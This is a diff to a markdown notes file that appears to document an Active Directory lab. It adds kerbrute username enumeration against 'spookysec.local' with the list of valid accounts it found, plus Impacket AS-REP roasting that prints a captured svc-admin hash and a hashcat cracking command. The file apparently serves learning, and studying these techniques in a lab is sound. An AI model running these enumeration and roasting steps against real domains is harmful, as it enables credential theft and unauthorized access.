@@ -30,7 +30,31 @@ You need to add the DNS domain name with the machine IP to /etc/hosts `10.10.253
 1. You need a wordlist for Users -> (User.txt)[https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt]
 2. 
 ```console
-$ ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
+$ ./kerbrute userenum --dc 10.10.227.157 -d spookysec.local userlist.txt
+
+Version: v1.0.3 (9dad6e1) - 03/12/22 - Ronnie Flathers @ropnop
+
+2022/03/12 12:12:10 >  Using KDC(s):
+2022/03/12 12:12:10 >   10.10.227.157:88
+
+2022/03/12 12:12:11 >  [+] VALID USERNAME:       james@spookysec.local
+2022/03/12 12:12:12 >  [+] VALID USERNAME:       svc-admin@spookysec.local
+2022/03/12 12:12:13 >  [+] VALID USERNAME:       James@spookysec.local
+2022/03/12 12:12:13 >  [+] VALID USERNAME:       robin@spookysec.local
+2022/03/12 12:12:18 >  [+] VALID USERNAME:       darkstar@spookysec.local
+2022/03/12 12:12:20 >  [+] VALID USERNAME:       administrator@spookysec.local
+2022/03/12 12:12:26 >  [+] VALID USERNAME:       backup@spookysec.local
+2022/03/12 12:12:28 >  [+] VALID USERNAME:       paradox@spookysec.local
+2022/03/12 12:12:45 >  [+] VALID USERNAME:       JAMES@spookysec.local
+2022/03/12 12:12:51 >  [+] VALID USERNAME:       Robin@spookysec.local
+2022/03/12 12:13:25 >  [+] VALID USERNAME:       Administrator@spookysec.local
+2022/03/12 12:14:36 >  [+] VALID USERNAME:       Darkstar@spookysec.local
+2022/03/12 12:14:59 >  [+] VALID USERNAME:       Paradox@spookysec.local
+2022/03/12 12:16:09 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
+2022/03/12 12:16:32 >  [+] VALID USERNAME:       ori@spookysec.local
+2022/03/12 12:17:16 >  [+] VALID USERNAME:       ROBIN@spookysec.local
+2022/03/12 12:19:04 >  Done! Tested 73317 usernames (16 valid) in 413.056 seconds
+
 ```
 
 ### Harvesting/ Bruteforce Tickets w Rubeus
@@ -72,3 +96,15 @@ $ hashcat -m 13100 -a 0 hash.txt wordlist.txt
 ```
 
 **Method2: Impacket**
+
+```console
+$ cd /usr/share/doc/python3-impacket/examples/
+
+$ ./GetNPUsers.py -no-pass -dc-ip 10.10.227.157 spookysec.local/svc-admin                                                                
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for svc-admin
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a9edf52350a4fa9634c1b0b8e88f180a$c4a770ce5ed7bfd6a853d0b16e279ad198530c0961bc03ebdb06cb22d65bef73422d803022e76893f27a2002130ceb7ad27ddbef1d13e878e8d41c40cdd4a3535af63f9c2de2a906873a89f3b73283d2df3d58736540ea611af315beb84c9ec36b3120e03e67c96b993c47467cfb727deb94778558a6b5b937c8f64b063114edbf146607828f969198eb3cbf88fa2b0a761ae2e6e12b5a579ec8a13b7543fd8c6b06eb1ed8e72d51c1e3d65f1aafd635e81dd0660aa09043918f7382eadb1725516872a8c4bdcdb6279a501efdb84cb37176ea95d23783f9a481e0c028581186ce6d7a96aac32ab8152a7317c1d278935ebc
+
+$ hashcat -m 18200 -a 0 hash.txt passwordlist.txt
+```
